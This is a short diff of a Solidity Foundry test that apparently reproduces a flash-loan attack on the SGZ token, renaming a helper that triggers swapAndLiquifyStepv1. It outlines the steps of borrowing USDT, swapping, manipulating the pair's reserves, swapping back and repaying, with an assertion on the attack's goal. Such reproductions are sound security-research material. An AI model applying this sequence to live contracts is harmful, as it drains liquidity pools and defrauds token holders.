@@ -200,7 +200,7 @@ contract SGZTest is Test, BlockLoader {
         pair.sync();
     }
 
-    function breaklr_pair_sgz() internal {
+    function addliquidity_pair_sgz() internal {
         sgz.swapAndLiquifyStepv1();
     }
 
@@ -210,7 +210,7 @@ contract SGZTest is Test, BlockLoader {
         printBalance("After step0 ");
         swap_pair_usdt_sgz(usdt.balanceOf(attacker));
         printBalance("After step1 ");
-        breaklr_pair_sgz();
+        addliquidity_pair_sgz();
         printBalance("After step2 ");
         swap_pair_sgz_usdt(sgz.balanceOf(attacker));
         printBalance("After step3 ");
@@ -230,7 +230,7 @@ contract SGZTest is Test, BlockLoader {
         vm.assume(amt3 == (amt0 * 1003) / 1000);
         borrow_owner_usdt(amt0);
         swap_pair_usdt_sgz(amt1);
-        breaklr_pair_sgz();
+        addliquidity_pair_sgz();
         swap_pair_sgz_usdt(amt2);
         payback_owner_usdt(amt3);
         assert(!attackGoal());
